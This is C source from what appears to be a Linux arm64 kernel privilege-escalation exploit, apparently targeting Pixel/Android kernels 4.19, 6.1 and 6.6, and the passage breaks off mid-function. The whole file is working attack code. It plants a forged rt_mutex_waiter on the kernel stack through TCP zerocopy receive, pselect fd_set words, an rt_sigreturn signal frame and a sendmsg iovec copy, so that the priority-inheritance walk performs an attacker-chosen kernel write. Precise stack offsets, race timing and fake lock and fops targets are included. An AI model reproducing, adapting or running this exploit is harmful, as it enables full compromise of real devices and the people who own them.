#include "common.h"
#include <time.h>
#include <netinet/in.h>
#include <netinet/tcp.h>
#ifdef GHOSTLOCK_TARGET_4_19
#include <ucontext.h>
#endif
static double fops_elapsed_ms(struct timespec *ref) {
  struct timespec now;
  clock_gettime(CLOCK_MONOTONIC, &now);
  return (now.tv_sec - ref->tv_sec) * 1000.0 + (now.tv_nsec - ref->tv_nsec) / 1e6;
}
extern int pselect_custom_write;

int route_last_step;
int route_last_errno;

/* TCP zerocopy route: getsockopt(TCP_ZEROCOPY_RECEIVE) parks a frame whose
 * zc words overlap the stale waiter; zc[0x28] is waiter->task, zc[0x30]
 * waiter->lock. */
#define TCP_PUNCH_SHMEM_LEN (16 * 1024 * 1024)
/* caps a route that never wins so a lost run does not spend the app timeout */
#define TCP_ROUTE_ATTEMPTS 128
#define TCP_ARM_SEQ 16
#define TCP_POST_GETSOCKOPT_HOLD 20000
/* compact pselect retry */
#define PSELECT_CFI_ROUTE_ATTEMPTS 4

#ifdef GHOSTLOCK_TARGET_4_19
/* 4.19 stack-plant via rt_sigreturn.
 *
 * The stale futex waiter lives at E-0x198 on the waiter thread's kernel
 * stack.  __arm64_sys_rt_sigreturn() has a 0x2a0 frame and copies the
 * signal frame's fpsimd vregs (0x200 bytes) to sp+0x20 = E-0x280.  The
 * waiter therefore starts at vregs+0xe8, and the whole 0x50 byte waiter
 * (tree, pi_tree, task, lock, prio, deadline) is covered by one copy.
 *
 * We cannot call rt_sigreturn directly without constructing a full arm64
 * signal frame, so let a real SIGUSR1 handler rewrite the fpsimd context
 * in its own signal frame and return through the normal trampoline.  The
 * handler runs synchronously on the waiter thread; when tgkill() returns
 * the kernel has already executed rt_sigreturn and planted the words.
 */
#define SIGRETURN_WAITER_VREG_OFF 0xe8
#define SIGRETURN_WAITER_WORDS 10

static volatile sig_atomic_t sigreturn_armed;
static volatile sig_atomic_t sigreturn_planted;
static volatile uint64_t sigreturn_words[SIGRETURN_WAITER_WORDS];

static void sigreturn_plant_handler(int sig, siginfo_t *info, void *uctx) {
  (void)sig;
  (void)info;
  if (!__atomic_load_n(&sigreturn_armed, __ATOMIC_ACQUIRE)) {
    return;
  }
  ucontext_t *uc = (ucontext_t *)uctx;
  unsigned char *reserved = (unsigned char *)uc->uc_mcontext.__reserved;
  struct _aarch64_ctx *head = (struct _aarch64_ctx *)reserved;
  if (head->magic != FPSIMD_MAGIC ||
      head->size < sizeof(struct fpsimd_context)) {
    return;
  }
  unsigned char *vregs = reserved + offsetof(struct fpsimd_context, vregs);
  uint64_t *dst = (uint64_t *)(vregs + SIGRETURN_WAITER_VREG_OFF);
  for (int i = 0; i < SIGRETURN_WAITER_WORDS; i++) {
    dst[i] = sigreturn_words[i];
  }
  __atomic_store_n(&sigreturn_planted, 1, __ATOMIC_RELEASE);
}

void install_sigreturn_plant_handler(void) {
  struct sigaction sa;
  memset(&sa, 0, sizeof(sa));
  sa.sa_sigaction = sigreturn_plant_handler;
  sa.sa_flags = SA_SIGINFO | SA_RESTART;
  sigemptyset(&sa.sa_mask);
  if (sigaction(SIGUSR1, &sa, NULL) != 0) {
    pr_warning("sigreturn handler install failed errno=%d\n", errno);
  }
}
#endif

struct tcp_punch_state {
  int fd;
  size_t page_size;
};

static atomic_int tcp_punch_go;
static atomic_int tcp_punch_stop;
static atomic_int tcp_punch_phase;
/* errno of the first puncher fallocate that failed; 0 while healthy */
static atomic_int tcp_punch_failed;

static void tcp_wait_for_consumer_idle(void) {
  atomic_store(&punch_consume_go, 0);
  while (atomic_load(&consumer_inflight)) {
    __asm__ volatile("yield" ::: "memory");
  }
}

static int tcp_make_pair(int *client_fd, int *server_fd) {
  int listener = socket(AF_INET, SOCK_STREAM | SOCK_CLOEXEC, 0);
  if (listener < 0) {
    return -1;
  }
  int one = 1;
  setsockopt(listener, SOL_SOCKET, SO_REUSEADDR, &one, sizeof(one));

  struct sockaddr_in addr;
  memset(&addr, 0, sizeof(addr));
  addr.sin_family = AF_INET;
  addr.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
  addr.sin_port = 0;

  if (bind(listener, (struct sockaddr *)&addr, sizeof(addr)) != 0 ||
      listen(listener, 1) != 0) {
    int saved = errno;
    close(listener);
    errno = saved;
    return -1;
  }

  socklen_t addr_len = sizeof(addr);
  if (getsockname(listener, (struct sockaddr *)&addr, &addr_len) != 0) {
    int saved = errno;
    close(listener);
    errno = saved;
    return -1;
  }

  *client_fd = socket(AF_INET, SOCK_STREAM | SOCK_CLOEXEC, 0);
  if (*client_fd < 0) {
    int saved = errno;
    close(listener);
    errno = saved;
    return -1;
  }
  if (connect(*client_fd, (struct sockaddr *)&addr, sizeof(addr)) != 0) {
    int saved = errno;
    close(*client_fd);
    close(listener);
    errno = saved;
    return -1;
  }

  *server_fd = accept4(listener, NULL, NULL, SOCK_CLOEXEC);
  int saved = errno;
  close(listener);
  if (*server_fd < 0) {
    close(*client_fd);
    errno = saved;
    return -1;
  }
  return 0;
}

static void *tcp_punch_thread(void *arg) {
  disable_rseq_for_thread();
  struct tcp_punch_state *state = arg;
  while (!atomic_load(&tcp_punch_go) && !atomic_load(&tcp_punch_stop)) {
    sched_yield();
  }
  while (!atomic_load(&tcp_punch_stop)) {
    if (fallocate(state->fd, 0, 0, TCP_PUNCH_SHMEM_LEN) != 0) {
      atomic_store(&tcp_punch_failed, errno ? errno : EIO);
      pr_warning("tcp punch fill errno=%d\n", errno);
      break;
    }
    atomic_store(&tcp_punch_phase, 1);
    if (fallocate(state->fd, FALLOC_FL_PUNCH_HOLE | FALLOC_FL_KEEP_SIZE,
                  (off_t)state->page_size,
                  TCP_PUNCH_SHMEM_LEN - state->page_size) != 0) {
      /* without the hole the target page keeps stale contents and the
       * zerocopy write misses */
      atomic_store(&tcp_punch_failed, errno ? errno : EIO);
      pr_warning("tcp punch hole errno=%d\n", errno);
    }
    atomic_store(&tcp_punch_phase, 0);
    if (atomic_load(&tcp_punch_failed)) {
      break;
    }
  }
  return NULL;
}

void do_tcp_fake_lock_route(void) {
  if (!page_base || !fake_lock || !fake_fops) {
    route_last_step = 40;
    route_last_errno = 0;
    pr_warning("tcp route missing page=%016zx lock=%016zx fops=%016zx\n",
             page_base, fake_lock, fake_fops);
    return;
  }

  int client_fd = -1;
  int server_fd = -1;
  int punch_fd = -1;
  char *map = MAP_FAILED;
  pthread_t puncher;
  int puncher_started = 0;
  int route_ok = 0;

  if (tcp_make_pair(&client_fd, &server_fd) != 0) {
    route_last_step = 41;
    route_last_errno = errno;
    pr_warning("tcp route pair setup failed errno=%d\n", errno);
    return;
  }

  size_t page_size = (size_t)sysconf(_SC_PAGESIZE);
  punch_fd = (int)syscall(SYS_memfd_create, "ghostlock-tcp", MFD_CLOEXEC);
  if (punch_fd < 0 ||
      fallocate(punch_fd, 0, 0, TCP_PUNCH_SHMEM_LEN) != 0) {
    route_last_step = 42;
    route_last_errno = errno;
    pr_warning("tcp route memfd/fallocate errno=%d\n", errno);
    goto out;
  }
  map = mmap(NULL, TCP_PUNCH_SHMEM_LEN, PROT_READ | PROT_WRITE,
             MAP_SHARED, punch_fd, 0);
  if (map == MAP_FAILED) {
    route_last_step = 43;
    route_last_errno = errno;
    pr_warning("tcp route mmap errno=%d\n", errno);
    goto out;
  }
  for (size_t off = 0; off < TCP_PUNCH_SHMEM_LEN; off += page_size) {
    map[off] = 0x55;
  }

  struct tcp_punch_state state = {.fd = punch_fd, .page_size = page_size};
  /* clear before the thread can start */
  atomic_store(&tcp_punch_stop, 0);
  atomic_store(&tcp_punch_phase, 0);
  atomic_store(&tcp_punch_failed, 0);
  atomic_store(&punch_consume_stop, 0);
  atomic_store(&punch_consume_go, 0);
  atomic_store(&consumer_calls, 0);
  atomic_store(&consumer_success, 0);
  if (pthread_create(&puncher, NULL, tcp_punch_thread, &state) != 0) {
    route_last_step = 44;
    route_last_errno = errno;
    pr_warning("tcp route punch thread errno=%d\n", errno);
    goto out;
  }
  puncher_started = 1;

  /* waiter->task carries init_task's phys alias, not the image address */
  uintptr_t waiter_task = SLIDE_INIT_TASK;
  int arm_seq = TCP_ARM_SEQ;
  int post_hold = TCP_POST_GETSOCKOPT_HOLD;

  pr_info("tcp route enter page=%016zx fake_lock=%016zx fake_w0=%016zx "
          "fake_task=%016zx task=%016zx attempts=%d arm=%d hold=%d\n",
          page_base, fake_lock, fake_w0, fake_task, waiter_task,
          TCP_ROUTE_ATTEMPTS, arm_seq, post_hold);

  atomic_store(&tcp_punch_go, 1);
  /* custom-write mode: fire the PI walk immediately */
  atomic_store(&main_route_delay_usec, 0);

  char sendbuf[64];
  memset(sendbuf, 0x33, sizeof(sendbuf));

  for (int i = 1; i <= TCP_ROUTE_ATTEMPTS && !route_ok; i++) {
    int calls_before = atomic_load(&consumer_calls);
    int success_before = atomic_load(&consumer_success);
    (void)send(server_fd, sendbuf, sizeof(sendbuf), MSG_DONTWAIT);
    while (atomic_load(&tcp_punch_phase)) {
      sched_yield();
    }
    for (int spin = 0;
         !atomic_load(&tcp_punch_phase) && !atomic_load(&tcp_punch_failed) &&
         spin < 10000000;
         spin++) {
      __asm__ volatile("yield" ::: "memory");
    }
    if (atomic_load(&tcp_punch_failed)) {
      route_last_step = 46;
      route_last_errno = atomic_load(&tcp_punch_failed);
      pr_warning("tcp route puncher failed errno=%d\n", route_last_errno);
      break;
    }

    unsigned char zc[0x40];
    memset(zc, 0, sizeof(zc));
    put64(zc, 0x18, (uint64_t)(uintptr_t)(map + page_size));
    put32(zc, 0x20, sizeof(sendbuf));
    put64(zc, 0x28, waiter_task);
    put64(zc, 0x30, fake_lock);

    socklen_t len = sizeof(zc);
    errno = 0;
    int ret = getsockopt(client_fd, IPPROTO_TCP, TCP_ZEROCOPY_RECEIVE, zc,
                         &len);
    int saved_errno = errno;
    /* release the consumer only once the zerocopy write landed in the
     * waiter frame; earlier release walks a half-written waiter */
    if (i >= arm_seq && ret == 0) {
      atomic_store(&punch_consume_go, i);
      for (int spin = 0; spin < post_hold; spin++) {
        __asm__ volatile("yield" ::: "memory");
      }
      tcp_wait_for_consumer_idle();
    }

    int calls = atomic_load(&consumer_calls);
    int success = atomic_load(&consumer_success);
    if (calls <= calls_before || success <= success_before) {
      if ((i % 100) == 0 || ret != 0) {
        pr_info("tcp route seq=%d ret=%d errno=%d len=%u calls=%d "
                "success=%d\n",
                i, ret, saved_errno, len, calls, success);
      }
      continue;
    }
    /* consumer fired: the PI walk derefed the crafted waiter and wrote.
     * stages verify their own effects; no cfi stage here. */
    pr_info("tcp route won seq=%d\n", i);
    route_ok = 1;
    route_last_step = 0;
    route_last_errno = 0;
  }

out:
  atomic_store(&punch_consume_go, 0);
  atomic_store(&punch_consume_stop, 1);
  atomic_store(&tcp_punch_go, 0);
  atomic_store(&tcp_punch_stop, 1);
  if (puncher_started) {
    pthread_join(puncher, NULL);
  }
  if (map != MAP_FAILED) {
    munmap(map, TCP_PUNCH_SHMEM_LEN);
  }
  if (punch_fd >= 0) {
    close(punch_fd);
  }
  if (server_fd >= 0) {
    close(server_fd);
  }
  if (client_fd >= 0) {
    close(client_fd);
  }
  if (!route_ok && route_last_step == 0) {
    route_last_step = 45;
  }
  pr_info("tcp route done=%d calls=%d success=%d step=%d errno=%d\n",
          route_ok, atomic_load(&consumer_calls),
          atomic_load(&consumer_success), route_last_step,
          route_last_errno);
}

static int route_delay_usec(int attempt) {
#ifdef LEGACY_RT_MUTEX_WAITER
  /* 4.19 uses the pselect stack-plant path with the same retry timing as the
   * compact 6.1 route, even though it does not use the TCP transport. */
  int pselect_route = 1;
#else
  int pselect_route = COMPACT_RT_MUTEX_WAITER;
#endif
  if (!pselect_route) {
    (void)attempt;
    /* let select set up its stack frame before the PI walk */
    return PSELECT_ENTER_DELAY_USEC;
  }
  const char *forced = getenv("PSELECT_DELAY_USEC");
  if (forced && *forced) {
    char *end = NULL;
    long value = strtol(forced, &end, 0);
    if (end != forced && !*end && value >= 0 && value <= 2000000) {
      return (int)value;
    }
  }
  static const int delays[] = {
    50000, 30000, 70000, 10000, 100000, 150000, 20000, 120000,
  };
  return delays[(attempt - 1) % 8];
}

static void compact_timeout_values(long *sec, long *usec) {
  *sec = 1;
  *usec = 0;
  const char *s = getenv("PSELECT_TIMEOUT_OVERRIDE_USEC");
  if (!s || !*s) {
    return;
  }
  char *end = NULL;
  errno = 0;
  long value = strtol(s, &end, 0);
  if (!errno && end != s && !*end && value >= 0) {
    *sec = value / 1000000;
    *usec = value % 1000000;
  }
}

void fdset_put_word(fd_set *set, int word, uint64_t value) {
  unsigned long *bits = (unsigned long *)set;
  bits[word] = (unsigned long)value;
}

uint64_t fdset_get_word(const fd_set *set, int word) {
  const unsigned long *bits = (const unsigned long *)set;
  return bits[word];
}

static int pselect_words_per_set(void) {
  int bits_per_word = (int)(8 * sizeof(unsigned long));
  return (PSELECT_ROUTE_NFDS + bits_per_word - 1) / bits_per_word;
}

static int pselect_put_global_word(
    fd_set *in, fd_set *out, fd_set *ex, int words_per_set,
    int global_word, uint64_t value) {
  if (global_word < 0) {
    return 0;
  }

  int set_idx = global_word / words_per_set;
  int word_idx = global_word % words_per_set;
  switch (set_idx) {
    case 0:
      fdset_put_word(in, word_idx, value);
      return 1;
    case 1:
      fdset_put_word(out, word_idx, value);
      return 1;
    case 2:
      fdset_put_word(ex, word_idx, value);
      return 1;
    default:
      return 0;
  }
}

static int pselect_waiter_shift(void) {
  return PSELECT_WAITER_WORD_SHIFT;
}

static void pselect_put_waiter_word(
    fd_set *in, fd_set *out, fd_set *ex, int words_per_set,
    int waiter_word, uint64_t value, const char *name) {
  int global_word = pselect_waiter_shift() + waiter_word;
  int placed = pselect_put_global_word(
      in, out, ex, words_per_set, global_word, value);
  if (!placed) {
    pr_warning("pselect cannot place %s waiter_word=%d global_word=%d "
               "words_per_set=%d nfds=%d\n",
               name, waiter_word, global_word, words_per_set,
               PSELECT_ROUTE_NFDS);
  }
}

void open_selected_fds(
    fd_set *in, fd_set *out, fd_set *ex, int read_fd, int write_fd) {
  /* every bit lands on the read end so select/pselect parks the full window */
  (void)write_fd;
  int high_read = fcntl(read_fd, F_DUPFD, PSELECT_ROUTE_NFDS + 32);
  if (high_read < 0) {
    pr_warning("pselect F_DUPFD read errno=%d\n", errno);
    return;
  }
  for (int fd = 0; fd < PSELECT_ROUTE_NFDS; fd++) {
    if (FD_ISSET(fd, in) || FD_ISSET(fd, out) || FD_ISSET(fd, ex)) {
      dup2(high_read, fd);
    }
  }
  close(high_read);
  dup2(read_fd, PSELECT_ROUTE_NFDS - 1);
  FD_SET(PSELECT_ROUTE_NFDS - 1, ex);
}

static int standard_io_backup[3] = {-1, -1, -1};

void reserve_standard_io(void) {
  for (int fd = 0; fd < 3; fd++) {
    if (standard_io_backup[fd] >= 0) continue;
    int backup = fcntl(fd, F_DUPFD, PSELECT_ROUTE_NFDS + 64);
    if (backup < 0) {
      pr_warning("standard io backup failed fd=%d errno=%d\n", fd, errno);
    } else {
      standard_io_backup[fd] = backup;
    }
  }
}

static void restore_standard_io(void) {
  for (int fd = 0; fd < 3; fd++) {
    if (standard_io_backup[fd] < 0) continue;
    dup2(standard_io_backup[fd], fd);
  }
}

void prepare_pselect_fdsets(fd_set *in, fd_set *out, fd_set *ex) {
  FD_ZERO(in);
  FD_ZERO(out);
  FD_ZERO(ex);

  int words_per_set = pselect_words_per_set();
  int compact = COMPACT_RT_MUTEX_WAITER;
#ifdef LEGACY_RT_MUTEX_WAITER
  (void)compact;
#endif

  struct pselect_waiter_word {
    int word;
    uint64_t value;
    const char *name;
  };

#ifdef LEGACY_RT_MUTEX_WAITER
  /* 4.19 layout.  The first entry lands at waiter+0x00 because shift=17 and
   * global word 19 is bits[]+0x98.  The pselect input sets must cover
   * global words 19..29, hence PSELECT_ROUTE_NFDS=640. */
  uint64_t relink_pc = fake_right ? fake_right : fake_parent;
  uint64_t relink_left = fake_right ? pselect_custom_target : fake_left;
  struct pselect_waiter_word words[] = {
    {2, 1, "tree_pc"},
    {3, 0, "tree_right"},
    {4, 0, "tree_left"},
    {5, relink_pc, "pi_pc"},
    {6, 0, "pi_right"},
    {7, relink_left, "pi_left"},
    {8, SLIDE_INIT_TASK, "task"},
    {9, fake_lock, "lock"},
    {10, FAKE_WAITER_PRIO, "prio"},
    {11, 0, "deadline"},
  };
  for (size_t i = 0; i < sizeof(words) / sizeof(words[0]); i++) {
    struct pselect_waiter_word *w = &words[i];
    pselect_put_waiter_word(
        in, out, ex, words_per_set, w->word, w->value, w->name);
  }
#else
  if (compact) {
    /* 6.1 compact write route (Root-My-Pixel-Payloads src/61/fops.c): tree/pi parents carry
     * the write value, children the write target; waiter->task is the
     * payload fake_task (planted fields for the PI walk). Value writes relink
     * left-only at the target, or the erase rebalance walks the target page. */
    uint64_t relink_pc = fake_right ? fake_right : fake_parent;
    uint64_t relink_left = fake_right ? pselect_custom_target : fake_left;
    struct pselect_waiter_word words[] = {
      {2, relink_pc, "tree_pc"},
      {3, 0, "tree_right"},
      {4, relink_left, "tree_left"},
      {5, relink_pc, "pi_pc"},
      {6, 0, "pi_right"},
      {7, relink_left, "pi_left"},
      {8, fake_task, "task"},
      {9, fake_lock, "lock"},
      {10, ((uint64_t)FAKE_WAITER_PRIO << 32) | 3, "wake_prio"},
      {11, 0, "deadline"},
      {12, 0, "ww_ctx"},
    };
    for (size_t i = 0; i < sizeof(words) / sizeof(words[0]); i++) {
      struct pselect_waiter_word *w = &words[i];
      pselect_put_waiter_word(
          in, out, ex, words_per_set, w->word, w->value, w->name);
    }
  } else {
    /* 6.6 rt_mutex_waiter with rb_node tree/pi_tree */
    struct pselect_waiter_word words[] = {
      {2, 0, "tree_pc"},
      {3, 0, "tree_right"},
      {4, 0, "tree_left"},
      {5, 1, "tree_prio"},
      {6, 0, "tree_deadline"},
      {7, 0, "pi_parent"},
      {8, 0, "pi_right"},
      {9, 0, "pi_left"},
      {10, 1, "pi_prio"},
      {11, 0, "pi_deadline"},
      {12, fake_task, "task"},
      {13, fake_lock, "lock"},
      {14, 3, "wake_state"},
    };
    for (size_t i = 0; i < sizeof(words) / sizeof(words[0]); i++) {
      struct pselect_waiter_word *w = &words[i];
      pselect_put_waiter_word(
          in, out, ex, words_per_set, w->word, w->value, w->name);
    }
  }
#endif
}

void do_pselect_fake_lock_route(void) {
  if (!page_base || !fake_lock || !fake_fops) {
    route_last_step = 30;
    route_last_errno = 0;
    pr_warning("pselect route missing kernel page base=%016zx lock=%016zx fops=%016zx\n",
             page_base, fake_lock, fake_fops);
    return;
  }

  struct timespec route_t0;
  clock_gettime(CLOCK_MONOTONIC, &route_t0);
  int pipefd[2];
  SYSCHK(pipe(pipefd));

#ifdef LEGACY_RT_MUTEX_WAITER
  int compact_route = 1;
  int attempts = PSELECT_CFI_ROUTE_ATTEMPTS;
#else
  int compact_route = COMPACT_RT_MUTEX_WAITER;
  int attempts = compact_route ? PSELECT_CFI_ROUTE_ATTEMPTS : 1;
#endif
  long compact_timeout_sec;
  long compact_timeout_usec;
  if (compact_route) {
    compact_timeout_values(&compact_timeout_sec, &compact_timeout_usec);
  }

  int calls = 0;
  int success = 0;
  int winner = 0;
  int leak_fds = 0;
  for (int attempt = 1; attempt <= attempts; attempt++) {
    if (compact_route && attempt > 1) {
      /* lost race clobbers the page, respray re-derives fake_* too */
      page_base = prepare_good_kernel_page();
      if (!page_base || !fake_lock || !fake_fops) {
        route_last_step = 35;
        route_last_errno = errno;
        pr_warning("pselect retry page prepare failed attempt=%d\n", attempt);
        break;
      }
    }

    /* park on a never-ready timerfd so the waiter stays stale on the
     * pselect stack for the consumer window */
    int block_fd = (int)syscall(SYS_timerfd_create, CLOCK_MONOTONIC, 0);
    if (block_fd < 0) {
      pr_warning("pselect timerfd_create failed errno=%d; using pipe read end\n",
                 errno);
      block_fd = pipefd[0];
    }
    int high_read = fcntl(block_fd, F_DUPFD, PSELECT_ROUTE_NFDS + 16);
    if (high_read < 0) {
      route_last_step = 31;
      route_last_errno = errno;
      pr_warning("pselect F_DUPFD read errno=%d\n", errno);
      if (block_fd != pipefd[0]) {
        close(block_fd);
      }
      close(pipefd[0]);
      close(pipefd[1]);
      return;
    }

    fd_set in;
    fd_set out;
    fd_set ex;
    prepare_pselect_fdsets(&in, &out, &ex);
    pr_info("pselect route setup attempt=%d/%d shift=%d page=%016zx "
            "fake_lock=%016zx fake_w0=%016zx fake_task=%016zx "
            "in0=%016llx in3=%016llx out0=%016llx ex0=%016llx "
            "ex1=%016llx ex2=%016llx ex3=%016llx\n",
            attempt, attempts, pselect_waiter_shift(),
            page_base, fake_lock, fake_w0, fake_task,
            (unsigned long long)fdset_get_word(&in, 0),
            (unsigned long long)fdset_get_word(&in, 3),
            (unsigned long long)fdset_get_word(&out, 0),
            (unsigned long long)fdset_get_word(&ex, 0),
            (unsigned long long)fdset_get_word(&ex, 1),
            (unsigned long long)fdset_get_word(&ex, 2),
            (unsigned long long)fdset_get_word(&ex, 3));
    log_sync();

    /* The route may replace low fds, including stdout and stderr. */
    reserve_standard_io();
    open_selected_fds(&in, &out, &ex, high_read, pipefd[1]);
    close(high_read);

    atomic_store(&consumer_calls, 0);
    atomic_store(&consumer_success, 0);
    atomic_store(&punch_consume_stop, 0);
    int delay_usec = route_delay_usec(attempt);
    atomic_store(&main_route_delay_usec, delay_usec);
    atomic_store(&punch_consume_go, attempt);

    pr_info("pselect pre-select attempt=%d/%d compact=%d +%.0fms\n",
            attempt, attempts, compact_route, fops_elapsed_ms(&route_t0));
    errno = 0;
    int ret;
    if (compact_route) {
      struct timespec ts = {
        .tv_sec = compact_timeout_sec,
        .tv_nsec = compact_timeout_usec * 1000,
      };
      ret = pselect(PSELECT_ROUTE_NFDS, &in, &out, &ex, &ts, NULL);
    } else {
      /* non-compact stays on select with its 200ms timeout */
      struct timeval timeout = {
        .tv_sec = PSELECT_TIMEOUT_SEC,
#ifdef PSELECT_TIMEOUT_USEC
        .tv_usec = PSELECT_TIMEOUT_USEC,
#else
        .tv_usec = 0,
#endif
      };
      ret = select(PSELECT_ROUTE_NFDS, &in, &out, &ex, &timeout);
    }
    int saved_errno = errno;
    restore_standard_io();
    pr_info("pselect post-select attempt=%d/%d compact=%d +%.0fms ret=%d\n",
            attempt, attempts, compact_route, fops_elapsed_ms(&route_t0), ret);
    atomic_store(&punch_consume_go, 0);

    /* RMGP pattern, wait out the consumer before closing the fds. The PI walk
     * runs on its CPU with the crafted waiter on the stack */
    int consumer_stuck = 0;
    if (atomic_load(&consumer_inflight) != 0) {
      for (int i = 0; i < 2000 && atomic_load(&consumer_inflight) != 0; i++) {
        usleep(1000);
      }
      consumer_stuck = atomic_load(&consumer_inflight) != 0;
    }

    calls = atomic_load(&consumer_calls);
    success = atomic_load(&consumer_success);
    pr_info("pselect returned attempt=%d/%d ret=%d errno=%d calls=%d "
            "success=%d delay=%d\n",
            attempt, attempts, ret, saved_errno, calls, success, delay_usec);

    if (calls > 0 && success > 0) {
      route_last_step = 0;
      route_last_errno = 0;
      winner = 1;
    } else {
      route_last_step = 33;
      route_last_errno = saved_errno;
    }

    /* open_selected_fds only closes its own F_DUPFD copy */
    if (consumer_stuck) {
      /* stuck in sched_setattr or futex, closing would reclaim objects its
       * syscall still uses, leak and let process exit reclaim them */
      route_last_step = 34;
      pr_warning("pselect consumer still inflight, leaking route fds\n");
      leak_fds = 1;
      break;
    }
    if (block_fd != pipefd[0]) {
      close(block_fd);
    }

    if (winner) {
      break;
    }
  }

  if (!leak_fds) {
    close(pipefd[0]);
    close(pipefd[1]);
  }

  pr_info("pselect route done calls=%d success=%d step=%d errno=%d\n",
          calls, success, route_last_step, route_last_errno);
}

#ifdef GHOSTLOCK_TARGET_4_19
/* The waiter thread must not make a syscall between the rt_sigreturn plant
 * and the consumer's PI walk: any syscall reuses the top of this thread's
 * kernel stack and overwrites the planted waiter.  The consumer runs on its
 * own stack, so a user-space busy wait is safe here. */
static void sigreturn_busy_wait(unsigned long long spins) {
  for (unsigned long long i = 0; i < spins; i++) {
    __asm__ volatile("yield" ::: "memory");
  }
}

void do_sigreturn_fake_lock_route(void) {
  if (!page_base || !fake_lock || !fake_fops) {
    route_last_step = 30;
    route_last_errno = 0;
    pr_warning("sigreturn route missing kernel page base=%016zx lock=%016zx fops=%016zx\n",
               (size_t)page_base, (size_t)fake_lock, (size_t)fake_fops);
    return;
  }

  struct timespec route_t0;
  clock_gettime(CLOCK_MONOTONIC, &route_t0);
  int attempts = PSELECT_CFI_ROUTE_ATTEMPTS;
  int calls = 0;
  int success = 0;
  int winner = 0;

  /* One AF_UNIX socketpair is enough.  The sendmsg below always stops in
   * rw_copy_check_uvector() with EINVAL after copying the whole iovec array;
   * no packet is ever queued, so the peer is only an fd reference. */
  int sv[2] = {-1, -1};
  if (socketpair(AF_UNIX, SOCK_DGRAM | SOCK_CLOEXEC, 0, sv) != 0) {
    route_last_step = 40;
    route_last_errno = errno;
    pr_warning("sigreturn repair socketpair failed errno=%d\n", errno);
    return;
  }

  for (int attempt = 1; attempt <= attempts; attempt++) {
    if (attempt > 1) {
      page_base = prepare_good_kernel_page();
      if (!page_base || !fake_lock || !fake_fops) {
        route_last_step = 35;
        route_last_errno = errno;
        pr_warning("sigreturn retry page prepare failed attempt=%d\n", attempt);
        break;
      }
    }

    uint64_t relink_pc = fake_right ? fake_right : fake_parent;
    uint64_t relink_left = fake_right ? pselect_custom_target : fake_left;
    sigreturn_words[0] = 1;                 /* tree_entry.rb_parent_color */
    sigreturn_words[1] = 0;                 /* tree_entry.rb_right */
    sigreturn_words[2] = 0;                 /* tree_entry.rb_left */
    sigreturn_words[3] = relink_pc;         /* pi_tree_entry.rb_parent_color */
    sigreturn_words[4] = 0;                 /* pi_tree_entry.rb_right */
    sigreturn_words[5] = relink_left;       /* pi_tree_entry.rb_left */
    sigreturn_words[6] = SLIDE_INIT_TASK;   /* task */
    sigreturn_words[7] = fake_lock;          /* lock */
    sigreturn_words[8] = FAKE_WAITER_PRIO;  /* prio */
    sigreturn_words[9] = 0;                 /* deadline */

    /* Prepare the repair iovec before the signal.  ___sys_sendmsg's fast
     * iovec array lands at E-0x1e8, so iovec[5] is exactly the stale waiter
     * at E-0x198.  Entries 5..7 rewrite waiter words 0..5 (tree_entry and
     * pi_tree), which is exactly the part fpsimd_update_current_state()
     * spills after rt_sigreturn.  The tail (task/lock/prio/deadline) comes
     * from the sigreturn copy and is not touched by the repair. */
    struct iovec iov[8];
    memset(iov, 0, sizeof(iov));
    iov[5].iov_base = (void *)(uintptr_t)1; /* tree_entry.rb_parent_color */
    iov[5].iov_len = 0;                      /* tree_entry.rb_right */
    iov[6].iov_base = NULL;                  /* tree_entry.rb_left */
    iov[6].iov_len = (size_t)relink_pc;      /* pi_tree_entry.rb_parent_color */
    iov[7].iov_base = NULL;                  /* pi_tree_entry.rb_right */
    iov[7].iov_len = (size_t)relink_left;    /* pi_tree_entry.rb_left */
    struct msghdr mh;
    memset(&mh, 0, sizeof(mh));
    mh.msg_iov = iov;
    mh.msg_iovlen = 8;

    /* Reset the consumer state before the signal: after rt_sigreturn the
     * waiter must do as little as possible before the consumer enters
     * sched_setattr. */
    atomic_store(&consumer_calls, 0);
    atomic_store(&consumer_success, 0);
    atomic_store(&punch_consume_stop, 0);
    atomic_store(&main_route_delay_usec, 0);

    __atomic_store_n(&sigreturn_planted, 0, __ATOMIC_RELEASE);
    __atomic_store_n(&sigreturn_armed, 1, __ATOMIC_RELEASE);
    pr_info("sigreturn plant setup attempt=%d/%d page=%016zx fake_lock=%016zx "
            "pc=%016zx left=%016zx\n",
            attempt, attempts, (size_t)page_base, (size_t)fake_lock,
            (size_t)relink_pc, (size_t)relink_left);
    log_sync();

    int tid = (int)syscall(SYS_gettid);
    errno = 0;
    long sret = syscall(SYS_tgkill, getpid(), tid, SIGUSR1);
    int saved_errno = errno;
    __atomic_store_n(&sigreturn_armed, 0, __ATOMIC_RELEASE);
    if (sret != 0 ||
        !__atomic_load_n(&sigreturn_planted, __ATOMIC_ACQUIRE)) {
      route_last_step = 36;
      route_last_errno = saved_errno;
      pr_warning("sigreturn signal failed attempt=%d sret=%ld errno=%d "
                 "planted=%d\n",
                 attempt, sret, saved_errno,
                 (int)__atomic_load_n(&sigreturn_planted, __ATOMIC_ACQUIRE));
      continue;
    }

    /* The rt_sigreturn epilogue has spilled stack pointers over tree_entry.
     * sendmsg() copies all eight iovec entries first and only then rejects
     * the kernel-pointer lengths with EINVAL, so this single call repairs
     * waiter words 0..5.  Arm the consumer immediately after that copy; the
     * consumer thread is already spinning and enters sched_setattr within a
     * few microseconds. */
    errno = 0;
    ssize_t smret = sendmsg(sv[0], &mh, 0);
    int sm_errno = errno;
    if (smret != -1 || sm_errno != EINVAL) {
      route_last_step = 37;
      route_last_errno = sm_errno;
      pr_warning("sigreturn repair sendmsg ret=%zd errno=%d; no copy\n",
                 smret, sm_errno);
      continue;
    }
    atomic_store(&punch_consume_go, attempt);

    unsigned long long spins = 0;
    while (atomic_load(&consumer_calls) == 0 && spins < 200000000000ULL) {
      __asm__ volatile("yield" ::: "memory");
      spins++;
    }
    spins = 0;
    while (atomic_load(&consumer_inflight) != 0 && spins < 200000000000ULL) {
      __asm__ volatile("yield" ::: "memory");
      spins++;
    }
    atomic_store(&punch_consume_go, 0);

    calls = atomic_load(&consumer_calls);
    success = atomic_load(&consumer_success);
    pr_info("sigreturn post attempt=%d/%d ms=%zd errno=%d calls=%d success=%d "
            "+%.0fms\n",
            attempt, attempts, smret, sm_errno, calls, success,
            fops_elapsed_ms(&route_t0));

    if (calls > 0 && success > 0) {
      route_last_step = 0;
      route_last_errno = 0;
      winner = 1;
      break;
    }
    route_last_step = 33;
    route_last_errno = 0;
